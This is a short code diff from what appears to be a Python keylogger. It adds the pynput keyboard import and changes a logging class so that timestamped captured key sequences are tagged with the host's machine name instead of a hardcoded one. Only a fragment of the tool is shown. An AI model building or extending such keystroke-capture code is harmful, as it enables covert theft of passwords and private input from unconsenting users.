@@ -1,3 +1,4 @@
+from pynput import keyboard
 from datetime import datetime
 from flask import jsonify
 import requests
@@ -47,7 +48,7 @@ class AddToFile:
         if not combined_keys:
             return None
         timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-        data = {"machine":"shenaor","logs":{timestamp:combined_keys}}
+        data = {"machine":platform.node(),"logs":{timestamp:combined_keys}}
         return data
 
 
